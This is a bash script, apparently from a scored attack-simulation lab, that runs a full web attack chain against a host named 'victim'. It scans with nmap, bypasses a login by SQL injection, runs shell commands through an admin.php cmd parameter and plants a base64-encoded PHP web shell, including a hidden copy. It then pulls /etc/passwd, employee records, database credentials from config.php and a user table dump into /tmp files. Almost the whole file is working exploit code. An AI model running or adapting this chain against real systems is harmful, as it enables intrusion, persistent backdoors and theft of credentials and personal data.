#!/bin/bash
###############################################################################
# VECTOR 1: Web Application Exploitation
# Kill Chain: Recon → SQLi → RCE → Web Shell Persistence → Exfiltration
# MITRE ATT&CK: T1595 → T1190 → T1059.004 → T1505.003 → T1041
###############################################################################
set -uo pipefail

VICTIM="${VICTIM_HOST:-victim}"
BACKEND="${BACKEND_URL:-http://backend:8080}"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} $1"; }
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
fail() { echo -e "${RED}[✗]${NC} $1"; }
info() { echo -e "${YELLOW}[*]${NC} $1"; }

TOTAL_POINTS=0
report_stage() {
    local stage="$1" mitre="$2" tactic="$3" points="$4" status="$5"
    TOTAL_POINTS=$((TOTAL_POINTS + points))
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  Stage: ${YELLOW}${stage}${NC}"
    echo -e "  MITRE: ${mitre} (${tactic})"
    echo -e "  Status: ${status}  |  Points: +${points}  |  Total: ${TOTAL_POINTS}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║        VECTOR 1: WEB APPLICATION EXPLOITATION            ║${NC}"
echo -e "${RED}║  SQLi → RCE → Web Shell → Exfiltration                   ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"

###############################################################################
# STAGE 1: Web Reconnaissance (T1595 - Active Scanning)
###############################################################################
info "Stage 1: Web Reconnaissance"
log "Running Nmap service scan on port 80..."

NMAP_OUT=$(nmap -sV "$VICTIM" -p 80 2>/dev/null)
echo "$NMAP_OUT"

log "Probing web application..."
WEB_RESP=$(curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM}/index.php" 2>/dev/null)
if [ "$WEB_RESP" = "200" ]; then
    ok "Web application found at http://${VICTIM}/index.php (HTTP $WEB_RESP)"
    
    log "Extracting page content..."
    curl -s "http://${VICTIM}/index.php" | head -20
    
    log "Checking for admin panel..."
    ADMIN_RESP=$(curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM}/admin.php" 2>/dev/null)
    if [ "$ADMIN_RESP" = "200" ]; then
        ok "Admin panel found at /admin.php"
    fi
    
    report_stage "Web Reconnaissance" "T1595" "Reconnaissance" 10 "${GREEN}SUCCESS${NC}"
else
    fail "Web application not reachable (HTTP $WEB_RESP)"
    report_stage "Web Reconnaissance" "T1595" "Reconnaissance" 2 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 2: SQL Injection (T1190 - Exploit Public-Facing Application)
###############################################################################
info "Stage 2: SQL Injection Attack"
log "Testing SQL injection on login form..."

SQLI_PAYLOAD="admin' OR '1'='1'-- -"
log "Payload: ${SQLI_PAYLOAD}"

SQLI_RESULT=$(curl -s "http://${VICTIM}/index.php" \
    -d "username=${SQLI_PAYLOAD}&password=x" 2>/dev/null)

if echo "$SQLI_RESULT" | grep -qi "welcome\|admin\|dashboard\|logged\|success"; then
    ok "SQL Injection successful — Authentication bypassed!"
    echo "$SQLI_RESULT" | head -10
    report_stage "SQL Injection" "T1190" "Initial Access" 20 "${GREEN}SUCCESS${NC}"
else
    # Try URL-encoded GET variant
    log "Trying GET-based injection..."
    SQLI_RESULT2=$(curl -s "http://${VICTIM}/index.php?username=admin%27%20OR%20%271%27%3D%271%27--%20-&password=x" 2>/dev/null)
    if echo "$SQLI_RESULT2" | grep -qi "welcome\|admin\|success\|user"; then
        ok "SQL Injection successful (GET method)"
        report_stage "SQL Injection" "T1190" "Initial Access" 20 "${GREEN}SUCCESS${NC}"
    else
        fail "SQL Injection did not return expected result"
        echo "$SQLI_RESULT" | head -5
        report_stage "SQL Injection" "T1190" "Initial Access" 5 "${YELLOW}PARTIAL${NC}"
    fi
fi

sleep 2

###############################################################################
# STAGE 3: Remote Code Execution (T1059.004 - Unix Shell)
###############################################################################
info "Stage 3: Remote Code Execution via admin.php"
log "Testing RCE via cmd parameter..."

RCE_WHOAMI=$(curl -s "http://${VICTIM}/admin.php?cmd=whoami" 2>/dev/null)
log "whoami: $RCE_WHOAMI"

if [ -n "$RCE_WHOAMI" ]; then
    ok "RCE confirmed — executing as: ${RCE_WHOAMI}"
    
    log "Gathering system info..."
    RCE_ID=$(curl -s "http://${VICTIM}/admin.php?cmd=id" 2>/dev/null)
    echo "  id: $RCE_ID"
    
    RCE_UNAME=$(curl -s "http://${VICTIM}/admin.php?cmd=uname+-a" 2>/dev/null)
    echo "  uname: $RCE_UNAME"
    
    log "Reading /etc/passwd..."
    curl -s "http://${VICTIM}/admin.php?cmd=cat+/etc/passwd" 2>/dev/null | head -5
    
    log "Listing sensitive directories..."
    curl -s "http://${VICTIM}/admin.php?cmd=ls+-la+/home/victim/sensitive_data/" 2>/dev/null
    
    report_stage "Remote Code Execution" "T1059.004" "Execution" 25 "${GREEN}SUCCESS${NC}"
else
    fail "RCE via admin.php?cmd= not working"
    report_stage "Remote Code Execution" "T1059.004" "Execution" 5 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 4: Web Shell Persistence (T1505.003 - Web Shell)
###############################################################################
info "Stage 4: Deploying Web Shell for Persistence"

# Base64-encoded PHP web shell: <?php system($_GET['c']); ?>
SHELL_B64="PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="

log "Writing web shell to /var/www/html/uploads/shell.php..."
DEPLOY_OUT=$(curl -s "http://${VICTIM}/admin.php?cmd=mkdir+-p+/var/www/html/uploads+%26%26+echo+${SHELL_B64}+|+base64+-d+>+/var/www/html/uploads/shell.php" 2>/dev/null)

sleep 1

log "Verifying web shell..."
SHELL_TEST=$(curl -s "http://${VICTIM}/uploads/shell.php?c=echo+SHELL_ACTIVE" 2>/dev/null)

if echo "$SHELL_TEST" | grep -q "SHELL_ACTIVE"; then
    ok "Web shell deployed and operational at /uploads/shell.php"
    
    log "Testing shell capabilities..."
    curl -s "http://${VICTIM}/uploads/shell.php?c=id" 2>/dev/null
    
    report_stage "Web Shell Persistence" "T1505.003" "Persistence" 30 "${GREEN}SUCCESS${NC}"
else
    fail "Web shell deployment failed or not accessible"
    log "Trying alternate deployment path..."
    curl -s "http://${VICTIM}/admin.php?cmd=echo+${SHELL_B64}+|+base64+-d+>+/var/www/html/.hidden.php" 2>/dev/null
    
    SHELL_TEST2=$(curl -s "http://${VICTIM}/.hidden.php?c=echo+SHELL_ACTIVE" 2>/dev/null)
    if echo "$SHELL_TEST2" | grep -q "SHELL_ACTIVE"; then
        ok "Alternate web shell at /.hidden.php"
        report_stage "Web Shell Persistence" "T1505.003" "Persistence" 25 "${GREEN}SUCCESS${NC}"
    else
        report_stage "Web Shell Persistence" "T1505.003" "Persistence" 5 "${RED}FAILED${NC}"
    fi
fi

sleep 2

###############################################################################
# STAGE 5: Data Exfiltration (T1041 - Exfiltration Over C2 Channel)
###############################################################################
info "Stage 5: Data Exfiltration"

# Use whichever shell works
SHELL_URL="http://${VICTIM}/uploads/shell.php?c="
SHELL_CHECK=$(curl -s "${SHELL_URL}echo+ok" 2>/dev/null)
if ! echo "$SHELL_CHECK" | grep -q "ok"; then
    SHELL_URL="http://${VICTIM}/admin.php?cmd="
fi

log "Exfiltrating /etc/passwd..."
PASSWD=$(curl -s "${SHELL_URL}cat+/etc/passwd" 2>/dev/null)
echo "$PASSWD" > /tmp/exfil_passwd.txt
ok "Saved $(wc -l < /tmp/exfil_passwd.txt) lines to /tmp/exfil_passwd.txt"

log "Exfiltrating sensitive data files..."
SENSITIVE=$(curl -s "${SHELL_URL}cat+/home/victim/sensitive_data/employee_records.csv" 2>/dev/null)
if [ -n "$SENSITIVE" ]; then
    echo "$SENSITIVE" > /tmp/exfil_employees.csv
    ok "Employee records exfiltrated ($(wc -l < /tmp/exfil_employees.csv) lines)"
fi

log "Dumping database credentials..."
DB_CREDS=$(curl -s "${SHELL_URL}cat+/var/www/html/config.php" 2>/dev/null)
if [ -n "$DB_CREDS" ]; then
    echo "$DB_CREDS" > /tmp/exfil_dbcreds.txt
    ok "Database credentials captured"
    echo "$DB_CREDS" | grep -i "pass\|user\|host\|db" 2>/dev/null || true
fi

log "Dumping database..."
DB_DUMP=$(curl -s "${SHELL_URL}mysql+-u+root+-e+'SELECT+*+FROM+victim_db.users;'+2>/dev/null" 2>/dev/null)
if [ -n "$DB_DUMP" ]; then
    echo "$DB_DUMP" > /tmp/exfil_dbdump.txt
    ok "Database dumped ($(wc -l < /tmp/exfil_dbdump.txt) rows)"
    echo "$DB_DUMP" | head -5
fi

report_stage "Data Exfiltration" "T1041" "Exfiltration" 30 "${GREEN}SUCCESS${NC}"

###############################################################################
# SUMMARY
###############################################################################
echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                 ATTACK CHAIN COMPLETE                     ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║${NC}  Vector:     Web Application Exploitation                ${RED}║${NC}"
echo -e "${RED}║${NC}  Stages:     5/5 executed                                ${RED}║${NC}"
echo -e "${RED}║${NC}  Total Score: ${GREEN}${TOTAL_POINTS} points${NC}                              ${RED}║${NC}"
echo -e "${RED}║${NC}                                                          ${RED}║${NC}"
echo -e "${RED}║${NC}  MITRE ATT&CK Techniques:                               ${RED}║${NC}"
echo -e "${RED}║${NC}    T1595  Active Scanning           (Reconnaissance)     ${RED}║${NC}"
echo -e "${RED}║${NC}    T1190  Exploit Public-Facing App (Initial Access)     ${RED}║${NC}"
echo -e "${RED}║${NC}    T1059  Unix Shell                (Execution)          ${RED}║${NC}"
echo -e "${RED}║${NC}    T1505  Web Shell                 (Persistence)        ${RED}║${NC}"
echo -e "${RED}║${NC}    T1041  Exfil Over C2 Channel     (Exfiltration)       ${RED}║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"

log "Exfiltrated files in /tmp/exfil_*.{txt,csv}"
ls -la /tmp/exfil_* 2>/dev/null || true
